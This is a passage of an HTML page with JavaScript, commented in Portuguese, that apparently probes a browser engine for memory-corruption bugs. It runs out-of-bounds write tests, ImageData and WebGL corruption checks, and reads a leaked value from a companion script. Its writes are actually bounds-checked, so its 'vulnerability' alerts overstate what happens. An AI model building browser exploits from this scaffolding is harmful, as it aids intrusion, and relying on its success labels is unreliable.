console.error(`Erro ImgData ${i}:`, e); potentialCorruptionDetected = true; } if(i % 5 === 0) await PAUSE(5); } if (patternMatched) { logCanvas(`SUCESSO: Corrupção detectada E padrão OOB lido ImageData!`, 'vuln', FNAME); } else if (potentialCorruptionDetected) { logCanvas(`AVISO: Corrupção/Erro detectado ImageData, mas padrão OOB não confirmado.`, 'warn', FNAME); logCanvas(` ---> *** ALERTA: Corrupção memória instável afetando ImageData! Investigar. ***`, 'escalation', FNAME); } else if (oobWritePerformed) { logCanvas(`Escrita OOB OK, nenhuma corrupção detectada ImageDatas.`, 'good', FNAME); } else { logCanvas(`Escrita OOB N/A/falhou, nenhuma corrupção detectada.`, 'good', FNAME); } logCanvas("--- Teste OOB Write -> ImageData Check Concluído ---",'test', FNAME); await PAUSE();};
        const testOOBWriteOnly = async () => { /* ...código original... */ const FNAME = 'testOOBWriteOnly'; logCanvas("--- Teste: OOB Write Only (Trigger) ---",'test', FNAME); const bufferOOBSize=64; const writeValue1=0xDEADBEEF; const writeValue2=0xCAFEBABE; const writeValueSize = 8; const allocationSize = bufferOOBSize + 256; const baseOffsetInBuffer = 128; let bufferOOB=null; let dv=null; let writeSuccess=false; try{ bufferOOB=new ArrayBuffer(allocationSize); dv=new DataView(bufferOOB); for(let i=0; i<bufferOOB.byteLength; i++)dv.setUint8(i, 0xDD); }catch(e){ logCanvas(`Erro alocar buffer ctrl: ${e.message}`,'error', FNAME); console.error(e); return false; } const oobWriteOffset = bufferOOBSize; const targetWriteAddr = baseOffsetInBuffer + oobWriteOffset; const relOffsetStr = `@${oobWriteOffset} (addr ${targetWriteAddr})`; try{ if(targetWriteAddr >= 0 && targetWriteAddr + writeValueSize <= bufferOOB.byteLength){ dv.setUint32(targetWriteAddr, writeValue1, true); dv.setUint32(targetWriteAddr + 4, writeValue2, true); logCanvas(`Escrita OOB U32x2 @ ${relOffsetStr} OK.`, 'vuln', FNAME); logCanvas(` ---> *** ALERTA: Primitivo Relevante (OOB Write) ***`, 'escalation', FNAME); writeSuccess=true; } else { logCanvas(`Offset OOB ${relOffsetStr} fora buffer.`, 'error', FNAME); } }catch(e){ logCanvas(`Escrita OOB U32x2 falhou @ ${relOffsetStr}: ${e.message}`, 'good', FNAME); } logCanvas("--- Teste OOB Write Only Concluído ---",'test', FNAME); await PAUSE(); return writeSuccess;};

        // --- Função Principal Canvas ---
        const runCanvasTestSequence = async () => {
            const FNAME = 'runCanvasTestSequence';
            outputDivCanvas = document.getElementById('output-canvas'); coordStatusDiv = document.getElementById('canvas-coord-status'); canvasElement = document.getElementById('interactive-canvas'); const runBtnCanvas = document.getElementById('runCanvasBtn');
            if (!outputDivCanvas || !runBtnCanvas || !canvasElement || !coordStatusDiv) { /* erro fatal */ return; }
            if (runBtnCanvas) runBtnCanvas.disabled = true; outputDivCanvas.innerHTML = '';
            logCanvas("Iniciando sequência focada do Script 2 (v15)...", "test", FNAME); // Manter v15 no log? ok

            imgSquares.length = 0; let sqX = 10; let sqY = imgSquaresStartY;
            for (let i = 0; i < 5; i++) { imgSquares.push({ id: `imgSq${i}`, x: sqX, y: sqY, size: imgSquareSize, color: ['#FF5733','#C70039','#900C3F','#581845','#FFC300'][i % 5], hover: false }); sqX += imgSquareSize + imgSquareSpacing; } // Cores diferentes

            try {
                try { ctx = canvasElement.getContext('2d'); if (!ctx) throw new Error("Falha Ctx 2D."); } catch(e) { logCanvas(`Falha Ctx 2D: ${e.message}`, 'critical', FNAME); throw e; }
                redrawAll(); await PAUSE();

                // Ler leak do Script 1
                 try { if (typeof leakedValueFromOOB !== 'undefined') { const l = leakedValueFromOOB; if(l){ const ls = l.type==='U64' ? `L(S1):U64 H=${toHexCanvas(l.high)} L=${toHexCanvas(l.low)}@${l.offset}` : `L(S1):U32 ${toHexCanvas(l.low)}@${l.offset}`; logCanvas(`-> Leak S1 encontrado: ${ls}`, 'leak', FNAME); currentLeakData = {text: ls, color: "#FF9800"};} else { logCanvas(`-> Leak S1 nulo/N/A.`, 'warn', FNAME); currentLeakData = {text:"L(S1):NULO", color:"#FFC107"}; } } else { logCanvas(`-> Var 'leakedValueFromOOB' S1 N/A.`, 'error', FNAME); currentLeakData = {text:"L(S1):Var N/A", color:"#F44336"}; } } catch (e) { logCanvas(`Erro leak S1: ${e.message}`, 'error', FNAME); currentLeakData = {text:"L(S1):ERRO", color:"#F44336"}; console.error(e); }
                redrawAll(); await PAUSE();

                // Sequência de Testes S2
                await testWebGLCheck();
                await testAdvancedPP();
                await testOOBReadEnhanced();
                await testOOBWriteMetadata();
                logCanvas("--- Iniciando Interação OOB Write -> WebGL ---", 'test', FNAME);
                 let lastOOBWriteSuccess = await testOOBWriteOnly();
                 await testWebGLDeeperPlus();
                 if (lastOOBWriteSuccess && glContext) { logCanvas(` ---> *** ALERTA POTENCIAL: WebGL OK após OOB Write. Investigar. ***`, 'escalation', FNAME); }
                 logCanvas("--- Interação OOB Write -> WebGL Concluída ---", 'test', FNAME);
                 await PAUSE();
                await testOOBWriteToImageDataCheck();

                logCanvas("--- Sequência principal concluída ---", 'test', FNAME);
                await PAUSE(100);

                // Adicionar listeners interativos
                 if(canvasClickListener && canvasElement) { try { canvasElement.removeEventListener('click', canvasClickListener); } catch(e){} } if(canvasMoveListener && canvasElement) { try { canvasElement.removeEventListener('mousemove', canvasMoveListener); } catch(e){} }
                 canvasMoveListener = (event) => { const rect = canvasElement.getBoundingClientRect(); const x = event.clientX - rect.left; const y = event.clientY - rect.top; let needsRedraw = false; let newHoverTarget = null; let cursorStyle = 'default'; interactiveAreas.forEach(a => { if (x >= a.x && x <= a.x + a.w && y >= a.y && y <= a.y + a.h) { newHoverTarget = a.id; cursorStyle = 'pointer'; } }); imgSquares.forEach(sq => { let oldHover=sq.hover; sq.hover = false; if (x >= sq.x && x <= sq.x + sq.size && y >= sq.y && y <= sq.y + sq.size) { newHoverTarget = sq.id; cursorStyle = 'crosshair'; sq.hover = true; } if(oldHover!==sq.hover) needsRedraw=true; }); if (newHoverTarget !== currentHoverTarget) { currentHoverTarget = newHoverTarget; needsRedraw = true; } try { if(needsRedraw){ redrawAll(); } canvasElement.style.cursor = cursorStyle; if(coordStatusDiv) coordStatusDiv.textContent=`Coords: X=${x.toFixed(0)}, Y=${y.toFixed(0)}`; } catch(e){ logCanvas(`Erro mousemove: ${e.message}`, 'error', 'MouseMove'); console.error(e); } };
                 canvasClickListener = async (event) => { const FNAME_CLICK = 'CanvasClick'; try{ const rect = canvasElement.getBoundingClientRect(); const x = event.clientX - rect.left; const y = event.clientY - rect.top; let clickedArea = null; interactiveAreas.forEach(a => { if (x >= a.x && x <= a.x + a.w && y >= a.y && y <= a.y + a.h) { clickedArea = a; } }); let clickedSquareIndex = -1; imgSquares.forEach((sq, index) => { if (x >= sq.x && x <= sq.x + sq.size && y >= sq.y && y <= sq.y + sq.size) { clickedSquareIndex = index; } }); if(clickedArea){ logCanvas(`--> Click Área: ${clickedArea.text} (ID: ${clickedArea.id})`,'vuln', FNAME_CLICK); switch(clickedArea.id){ case 'rect-log': logCanvas('Click log btn.', 'info', FNAME_CLICK); break; case 'rect-link': logCanvas('Abrindo link...', 'info', FNAME_CLICK); try{ window.open('https://google.com','_blank'); }catch(e){ logCanvas('Erro window.open: '+e.message,'error', FNAME_CLICK);} break; case 'rect-rerun': logCanvas('Re-lendo leak S1...', 'info', FNAME_CLICK); try { /* ...código re-read leak ... */ if (typeof leakedValueFromOOB !== 'undefined') { const l = leakedValueFromOOB; if(l){ const ls = l.type==='U64' ? `L(S1):U64 H=${toHexCanvas(l.high)} L=${toHexCanvas(l.low)}@${l.offset}` : `L(S1):U32 ${toHexCanvas(l.low)}@${l.offset}`; logCanvas(`-> Re-read Leak S1: ${ls}`, 'leak', FNAME_CLICK); currentLeakData = {text: ls, color: "#FF9800"};} else { logCanvas(`-> Re-read Leak S1: Nulo`, 'warn', FNAME_CLICK); currentLeakData = {text:"L(S1):NULO", color:"#FFC107"}; } } else { logCanvas(`-> Re-read Leak S1: Var N/A`, 'error', FNAME_CLICK); currentLeakData = {text:"L(S1):Var N/A", color:"#F44336"}; } } catch(e){ logCanvas(`Erro re-ler leak S1: ${e.message}`,'error', FNAME_CLICK);} redrawAll(); break;}} else if (clickedSquareIndex !== -1){ const sq = imgSquares[clickedSquareIndex]; logCanvas(`--> Click Quadrado ID: ${sq.id}`, 'vuln', FNAME_CLICK); let actionError = null; const runBtnCanvas = document.getElementById('runCanvasBtn'); if (runBtnCanvas) runBtnCanvas.disabled = true; logCanvas(`Executando ação ${sq.id}...`, 'test', FNAME_CLICK); try { switch(sq.id) { case 'imgSq0': await testOOBWriteMetadata(); break; case 'imgSq1': await testWebGLDeeperPlus(); break; case 'imgSq2': await testOOBWriteToImageDataCheck(); break; /* Adicionar ações para Sq3, Sq4 se necessário */ default: logCanvas(`Ação ${sq.id} N/A.`, 'warn', FNAME_CLICK); } logCanvas(`Ação ${sq.id} OK.`, 'good', FNAME_CLICK); } catch (e) { logCanvas(`Erro ação ${sq.id}: ${e.message}`, 'error', FNAME_CLICK); console.error(`Erro ação ${sq.id}:`, e); actionError = e; } finally { sq.color = actionError ? 'orange' : 'purple'; redrawAll(); if (runBtnCanvas) runBtnCanvas.disabled = false; logCanvas(`Re-run ${sq.id} finalizado.`, 'test', FNAME_CLICK); } } }catch(e){ logCanvas(`Erro GERAL clique: ${e.message}`,'error', FNAME_CLICK); console.error(e); } }; // Fim listener
                 canvasElement.addEventListener('click', canvasClickListener); canvasElement.addEventListener('mousemove', canvasMoveListener); redrawAll();

            } catch(e) { logCanvas(`Erro GERAL SCRIPT 2: ${e.message}`, 'critical', FNAME); console.error("Erro GERAL SCRIPT 2:", e); if(e.stack) console.error(e.stack); }
             finally { logCanvas("--- Fim da execução Script 2 ---", 'test', FNAME); const runBtnCanvas = document.getElementById('runCanvasBtn'); if (runBtnCanvas) runBtnCanvas.disabled = false; }
        };

        // Funções wrapper e unload
        const runCanvasTest = async () => { await runCanvasTestSequence(); };
        window.addEventListener('unload', () => { try { if (canvasClickListener && canvasElement) canvasElement.removeEventListener('click', canvasClickListener); if (canvasMoveListener && canvasElement) canvasElement.removeEventListener('mousemove', canvasMoveListener); } catch(e) {} console.log("[Canvas Unload] Limpeza OK."); });
    </script>

</body>
</html>
